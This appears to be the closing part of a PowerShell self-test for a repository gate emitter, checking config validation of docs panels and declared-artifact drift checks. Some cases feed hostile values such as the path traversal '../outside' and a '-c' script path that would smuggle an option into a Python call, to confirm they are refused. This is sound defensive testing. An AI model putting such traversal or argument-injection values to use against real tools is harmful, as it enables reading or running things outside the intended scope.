          "panels[4]: id 'docs' is reserved for the documents tab — entry ignored",
          "panels[5]: id 'Top-1' must match ^[a-z][a-z0-9_-]*$ — entry ignored"]:
    if not any(e in m for m in w):
        fails.append("missing 0061 warning: %s" % e)
cfg, w = load({"docs": {"customer": {"panels": [{"module": "scripts/panels/ok.py", "label": "x", "id": "x"}], "default_tab": "nope"}}})
if cfg["customer"]["default_tab"] != "" or not any("default_tab: 'nope' is not a tab id (docs, x)" in m for m in w):
    fails.append("an unknown default_tab was not warned + unset: %r" % w)
cfg, w = load({"docs": {"customer": {"panels": [{"module": "scripts/panels/ok.py", "label": "A"}, {"module": "scripts/panels/ok.py", "label": "a"}]}}})
if [p["id"] for p in cfg["customer"]["panels"]] != ["a", "panel-1"] or not any("derived id 'a' collides" in m for m in w):
    fails.append("a colliding derived id did not fall back to panel-<n> with a warning: %r %r" % (cfg["customer"]["panels"], w))
# review 2026-08-27 (high): the fallback must skip an id an EARLIER entry declared — `id: "panel-1"`
#    followed by a Korean label (empty slug) would otherwise give two tabs one data-top / scope class
cfg, w = load({"docs": {"customer": {"panels": [{"module": "scripts/panels/ok.py", "label": "A", "id": "panel-1"}, {"module": "scripts/panels/ok.py", "label": "데모"}]}}})
if [p["id"] for p in cfg["customer"]["panels"]] != ["panel-1", "panel-2"]:
    fails.append("a derived fallback collided with a declared id: %r" % [p["id"] for p in cfg["customer"]["panels"]])
# review 2026-08-27 (medium): a non-string display value is IGNORED — so it must also leave `declared`,
#    or the builder reads the untouched "" as an intentional blank instead of filling its default
cfg, w = load({"docs": {"customer": {"footer_date_label": 123, "title": ["x"]}}})
c = cfg["customer"]
if c["footer_date_label"] != "" or "footer_date_label" in c["declared"] or "title" in c["declared"] \
   or not any("footer_date_label: must be a string — ignored" in m for m in w):
    fails.append("an ignored non-string display value stayed in declared: %r %r" % (c["declared"], w))
print("AA-OK" if not fails else "AA-FAIL: " + "; ".join(fails))
'@
$aaRoot = Join-Path $fxBase 'customer-decl'
New-Item -ItemType Directory -Force -Path $aaRoot | Out-Null
$rAA = (& $py.Source $aaScript $PSScriptRoot $aaRoot 2>&1 | Out-String)
$ok = (Assert-True 'AA docs.customer: off/malformed/validated stay distinct, a traversal dir is refused, every degraded value warns' ($rAA -match 'AA-OK') $rAA) -and $ok

# AA2: the CLI path — the refusal reaches the emitter's warning channel, where CI reads it, and
# the run stays advisory (exit 0): the declaration is metadata class (ADR 0038), not a gate.
$CFG_CUST = @'
{
  "docs": { "customer": { "dir": "../outside" } },
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": []
}
'@
$aa2 = New-Repo 'customer-cli' $CFG_CUST @('src/x.py')
$rAA2 = Invoke-Gates $aa2 @()
$ok = (Assert-True 'AA2 the emitter surfaces a refused customer dir as a warning and stays advisory' `
    ($rAA2.Out -match "docs\.customer\.dir: '\.\./outside' refused" -and $rAA2.Code -eq 0) "exit=$($rAA2.Code): $($rAA2.Out)") -and $ok

# --- AB: declared-artifact source + drift check (ADR 0068) --------------------------------------
# `source` is completeness (allowlist-clean path that EXISTS); `check` is the script-gate shape
# minus `files`, composed into the gates window as `# whole-program` — CI's extraction runs it,
# pre-commit's existing rule defers it, `seen` dedupes it against an identical group gate. A
# check on a VIOLATING item must never emit: half-validated enforcement reading as enforcement
# is the defect class. All failure shapes are `artifact: VIOLATION` (CI's fail string), never a
# warn-and-drop.
function New-Ab([string]$Name, [string]$Items, [string]$Gates = '[]') {
    $cfg = @"
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "artifacts": { "readme": "README.md", "items": [ $Items ] },
  "groups": [ { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "", "gates": $Gates } ]
}
"@
    $r = New-Repo $Name $cfg @('src/x.py')
    Set-Content -LiteralPath (Join-Path $r 'README.md') -Value "docs: $SURL" -NoNewline
    New-Item -ItemType Directory -Force -Path (Join-Path $r 'docs'), (Join-Path $r 'scripts') | Out-Null
    Set-Content -LiteralPath (Join-Path $r 'docs/page.html') -Value '<p>page</p>' -NoNewline
    Set-Content -LiteralPath (Join-Path $r 'scripts/check_drift.py') -Value 'import sys; sys.exit(0)' -NoNewline
    return $r
}

# AB1: valid source + check — ok line carries both, the check lands in the window whole-program.
$ab1 = New-Ab 'ab1-ok' ('{ "url": "' + $SURL + '", "title": "ab1-ok · docs", "source": "docs/page.html", "check": { "runner": "python", "script": "scripts/check_drift.py" } }')
$rAB1 = Invoke-Gates $ab1 @()
$ok = (Assert-True 'AB1 ok line reports source committed and check declared' ($rAB1.Out -match 'artifact: ok — .*· source docs/page\.html committed · check declared — emitted under gates: as whole-program') $rAB1.Out) -and $ok
# No trailing $ anchors: Out-String yields CRLF lines and .NET multiline $ matches before \n,
# not before \r — the first run of these two cases failed on exactly that.
$ok = (Assert-True 'AB1 the [artifacts] header sits inside the gates window in group-header shape' ($rAB1.Out -match '(?m)^  \[artifacts\] 1 declared drift check\(s\) — run on every slice \(ADR 0068\)') $rAB1.Out) -and $ok
$ok = (Assert-True 'AB1 the check is a 4-space command line marked # whole-program (CI runs it, pre-commit defers it)' ($rAB1.Out -match '(?m)^    python scripts/check_drift\.py   # whole-program: declared-artifact drift check \(ADR 0068\)') $rAB1.Out) -and $ok

# AB2: a group already declares the identical whole-program gate — `seen` dedupes VISIBLY, the
# command is emitted exactly once (the canon's own dogfood state: onboarding group + item check).
$ab2 = New-Ab 'ab2-dedupe' ('{ "url": "' + $SURL + '", "title": "ab2-dedupe · docs", "source": "docs/page.html", "check": { "runner": "python", "script": "scripts/check_drift.py" } }') '[ { "runner": "python", "script": "scripts/check_drift.py", "files": false } ]'
$rAB2 = Invoke-Gates $ab2 @()
$ab2Run = @(($rAB2.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' -and $_ -match 'check_drift' })
$ok = (Assert-True 'AB2 an identical group gate dedupes the check to ONE command line' ($ab2Run.Count -eq 1) "lines: $($ab2Run -join ' | ')") -and $ok
$ok = (Assert-True 'AB2 the dedupe is visible, never silent' ($rAB2.Out -match '\(already emitted above — deduplicated: python scripts/check_drift\.py\)') $rAB2.Out) -and $ok

# AB3: a source missing from the tree is a VIOLATION, and the item's otherwise-valid check must
# NOT emit — half-validated enforcement reading as enforcement is the defect class.
$ab3 = New-Ab 'ab3-nosrc' ('{ "url": "' + $SURL + '", "title": "ab3-nosrc · docs", "source": "docs/absent.html", "check": { "runner": "python", "script": "scripts/check_drift.py" } }')
$rAB3 = Invoke-Gates $ab3 @()
$ok = (Assert-True 'AB3 a missing source file is a VIOLATION naming the path' ($rAB3.Out -match "artifact: VIOLATION — 'ab3-nosrc · docs': declared source 'docs/absent\.html' is not a file in the tree") $rAB3.Out) -and $ok
$ok = (Assert-True 'AB3 the violating item emits NO check' ($rAB3.Out -notmatch '\[artifacts\]' -and $rAB3.Out -notmatch 'declared-artifact drift check') $rAB3.Out) -and $ok

# AB4: a traversal source is refused at the allowlist, not by the existence probe.
$ab4 = New-Ab 'ab4-trav' ('{ "url": "' + $SURL + '", "title": "ab4-trav · docs", "source": "../outside.html" }')
$rAB4 = Invoke-Gates $ab4 @()
$ok = (Assert-True 'AB4 a traversal source is refused' ($rAB4.Out -match "artifact: VIOLATION.*source '\.\./outside\.html' refused") $rAB4.Out) -and $ok

# AB5: a check without a source is a VIOLATION — a drift check needs the file it guards.
$ab5 = New-Ab 'ab5-nosource' ('{ "url": "' + $SURL + '", "title": "ab5-nosource · docs", "check": { "runner": "python", "script": "scripts/check_drift.py" } }')
$rAB5 = Invoke-Gates $ab5 @()
$ok = (Assert-True 'AB5 check without source is a VIOLATION' ($rAB5.Out -match 'artifact: VIOLATION.*check declared without source') $rAB5.Out) -and $ok

# AB6: a check runner outside the closed set is a VIOLATION (never a warn-and-drop) and emits
# nothing; a bad script path is the same class.
$ab6 = New-Ab 'ab6-runner' ('{ "url": "' + $SURL + '", "title": "ab6-runner · docs", "source": "docs/page.html", "check": { "runner": "bash", "script": "scripts/check_drift.py" } }')
$rAB6 = Invoke-Gates $ab6 @()
$ok = (Assert-True 'AB6 a check runner outside the closed set is a VIOLATION' ($rAB6.Out -match "artifact: VIOLATION.*check runner 'bash' is not in the closed set" -and $rAB6.Out -notmatch '\[artifacts\]') $rAB6.Out) -and $ok
$ab6b = New-Ab 'ab6b-script' ('{ "url": "' + $SURL + '", "title": "ab6b-script · docs", "source": "docs/page.html", "check": { "runner": "python", "script": "-c" } }')
$rAB6b = Invoke-Gates $ab6b @()
$ok = (Assert-True 'AB6b a leading-dash check script is refused as a VIOLATION' ($rAB6b.Out -match "artifact: VIOLATION.*check script path '-c' refused") $rAB6b.Out) -and $ok

# AB7: `files` is not a check key — warned, ignored, the check still emits (a check is ALWAYS
# whole-program; a JSON string "false" here must never invert into file-scoping, the fact-36 class).
$ab7 = New-Ab 'ab7-files' ('{ "url": "' + $SURL + '", "title": "ab7-files · docs", "source": "docs/page.html", "check": { "runner": "python", "script": "scripts/check_drift.py", "files": true } }')
$rAB7 = Invoke-Gates $ab7 @()
$ok = (Assert-True 'AB7 a files key on a check warns and is ignored; the check still emits whole-program' ($rAB7.Out -match "warn: artifacts\.items\[0\]\.check: 'files' is not a check key" -and $rAB7.Out -match '(?m)^    python scripts/check_drift\.py   # whole-program: declared-artifact drift check') $rAB7.Out) -and $ok

# AB8: source without check is legal — completeness enforced, the drift gap SAID, never silent.
$ab8 = New-Ab 'ab8-nocheck' ('{ "url": "' + $SURL + '", "title": "ab8-nocheck · docs", "source": "docs/page.html" }')
$rAB8 = Invoke-Gates $ab8 @()
$ok = (Assert-True 'AB8 source without check reports the unenforced drift gap on the ok line' ($rAB8.Out -match 'artifact: ok — .*source docs/page\.html committed · no check declared — drift between this source and its generator is unenforced') $rAB8.Out) -and $ok

# AB9: a url+title-only item (ADR 0032's shape) is legal — and the ok line SAYS it is
# hand-published with nothing to republish from, so the artifact-publish skill's step-1 taxonomy
# has a shape for it (dist issue #2: the bare ok line matched none, and the skill had no defined
# outcome for a source-less item).
$ab9 = New-Ab 'ab9-handpub' ('{ "url": "' + $SURL + '", "title": "ab9-handpub · docs" }')
$rAB9 = Invoke-Gates $ab9 @()
$ok = (Assert-True 'AB9 a source-less item names the hand-published shape on the ok line' ($rAB9.Out -match 'artifact: ok — .*· no source declared — hand-published page \(ADR 0032 shape\); not publishable via /ywr-harness:artifact-publish') $rAB9.Out) -and $ok
$ok = (Assert-True 'AB9 a source-less item emits no check and stays ok, never a VIOLATION' ($rAB9.Out -notmatch '\[artifacts\]' -and $rAB9.Out -notmatch 'artifact: VIOLATION') $rAB9.Out) -and $ok

Remove-FixtureRoot $fxBase

Restore-GitPath
if (-not $ok) { Write-Host 'harness_gates selftest: FAILED' -ForegroundColor Red; exit 1 }
Write-Host 'harness_gates selftest: all cases green' -ForegroundColor Green
exit 0
